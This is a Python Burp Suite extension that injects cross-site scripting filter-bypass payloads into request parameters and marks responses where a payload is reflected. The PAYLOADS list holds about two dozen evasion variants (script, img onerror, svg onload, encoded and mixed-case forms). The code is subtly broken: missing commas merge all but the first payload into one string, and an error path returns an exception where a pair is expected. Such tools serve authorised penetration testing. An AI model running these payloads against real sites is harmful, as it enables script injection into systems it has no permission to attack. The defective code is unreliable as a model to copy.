#!/usr/bin/env python
# coding:utf-8
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

import os
import re
import urllib

from burp import IBurpExtender
from burp import IHttpListener
from java.io import PrintWriter
from java.lang.String import getMethod
from burp import IContextMenuFactory
from javax.swing import JMenu
from javax.swing import JMenuItem
import hashlib
import urllib
import json

try:
  from exceptions_fix import FixBurpExceptions
except ImportError:
  pass


PAYLOADS = [
    '<script>alert(1)</script>',
    '<<SCRIPT>alert(1);//\<</SCRIPT>'
    '<scrscriptipt>alert(1)</scrscriptipt>'
    '¼script¾alert(1)¼/script¾'
    '<script>alert`1`</script>'
    '<ScRiPt>alert(1)</sCriPt>'
    '<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>'
    '<IMG SRC="javascript:alert(1);">'
    '<IMG SRC=JaVaScRiPt:alert(1)>'
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
    '<IMG SRC="jav ascript:alert(1);">'
    '<IMG SRC="jav&#x09;ascript:alert(1);">'
    '<IMG SRC="jav&#x0A;ascript:alert(1);">'
    '<IMG SRC="jav&#x0D;ascript:alert(1);">'
    '<IMG SRC=" &#14; javascript:alert(1);">'
    '<svg onload=alert(1)>'
    '<svg onload=alert&#40;1&#41></svg>'
    '<svg	onload=alert(1)><svg>'
    '<svg/onload=alert(1)>'
    '<svg onload=alert`1`></svg>'
    '<svg onload=alert&lpar;1&rpar;></svg>'
    '<body onload=alert()>'
    '<details open ontoggle="alert()">'
    '<video autoplay onloadstart="alert()" src=x></video>'
    '<p style="animation: x;" onanimationstart="alert()">XSS</p>'
]

PAYLOAD_TAG = '{XSS}'


class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XSS Filter Bypass")
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        self.menus = []
        self.mainMenu = JMenu("XSS Filter Bypass")
        self.menus.append(self.mainMenu)
        self.invocation = invocation

        menuItem = PAYLOADS
        for payload in menuItem:
            menu = JMenuItem(payload, None,
                             actionPerformed=lambda
                                 x: self.requestModify(
                                 x))
            self.mainMenu.add(menu)
        return self.menus if self.menus else None

    def requestModify(self, x):
        self.payload = PAYLOAD_TAG+x.getSource().text+PAYLOAD_TAG
        currentRequest = self.invocation.getSelectedMessages()[0]
        requestInfo = self._helpers.analyzeRequest(currentRequest)
        self.headers = list(requestInfo.getHeaders())
        if (requestInfo.getMethod() == "GET"):
            body = currentRequest.getRequest()  # return byte[]
            requestInfo = self._helpers.analyzeRequest(
                currentRequest)  # returns IResponseInfo
            paraList = requestInfo.getParameters()  # array
            # print 'paraList',paraList
            new_requestInfo = body
            white_action = ['action', 'sign']
            for para in paraList:
                if para.getType() == 0 and not self.Filter(white_action,
                                                           para.getName()):
                    value = para.getValue() + self.payload
                    key = para.getName()
                    newPara = self._helpers.buildParameter(key, value,
                                                           para.getType())
                    new_requestInfo = self._helpers.updateParameter(
                        new_requestInfo,
                        newPara)  # updateParameter(byte[],IParameter) return byte[]

            currentRequest.setRequest(new_requestInfo)

        elif (requestInfo.getMethod() == "POST"):
            bodyBytes = currentRequest.getRequest()[
                        requestInfo.getBodyOffset():]
            self.body = self._helpers.bytesToString(bodyBytes)
            o, n = self.update_body(urllib.unquote(self.body))
            self.body = self.body.replace(o, n)
            newMessage = self._helpers.buildHttpMessage(self.headers,
                                                        self.body)
            currentRequest.setRequest(newMessage)

    def Filter(self, white_action, key):
        return True if ([True for i in white_action if
                         i in key.lower()]) else False

    def update_body(self, body=""):
        try:
            o = body
            white_action = ['submit', 'token', 'code', 'id', 'password']
            for item in self.headers:
                if (item.startswith(
                        'Content-Type:') and 'application/json' in item) or body.startswith(
                        '{"'):
                    json_type = 1
                    break
                else:
                    json_type = 0
            if json_type == 0:
                params = o.split('&')
                for i in range(len(params)):
                    if self.Filter(white_action, params[i].split('=')[0]):
                        continue
                    params[i] = params[i] + self.payload
                n = '&'.join(params)
                return o, n
            if json_type == 1:
                data = json.loads(o)
                for item in data:
                    if self.Filter(white_action, item):
                        continue
                    data[item] = data[item] + self.payload
                n = json.dumps(data)
                return o, n
        except Exception as e:
            return e

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag == 64 or toolFlag == 16 or toolFlag == 32:
            if messageIsRequest:
                request = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeRequest(
                    request)
                headers = analyzedRequest.getHeaders()
                body = request[analyzedRequest.getBodyOffset():]
                body_string = body.tostring()
                self.payload = re.search(r'{XSS}[^{]+{XSS}', body_string)
                if self.payload:
                    new_body_string = body_string.replace(PAYLOAD_TAG, '')
                    new_body = self._helpers.bytesToString(new_body_string)
                    self.payload = self.payload.group(0).replace(PAYLOAD_TAG, '')
                    messageInfo.setRequest(
                        self._helpers.buildHttpMessage(headers, new_body)
                    )
            if not messageIsRequest:
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(
                    response)
                headers = analyzedResponse.getHeaders()
                body = response[analyzedResponse.getBodyOffset():]
                body_string = body.tostring()
                text = body_string.find(self.payload)
                if text != -1:
                    new_body_string = body_string.replace(
                        self.payload,
                        '<!-- Your payload works here >>> -->' + self.payload
                    )
                    new_body = self._helpers.bytesToString(new_body_string)
                    messageInfo.setResponse(
                        self._helpers.buildHttpMessage(headers, new_body)
                    )


try:
    FixBurpExceptions()
except:
    pass
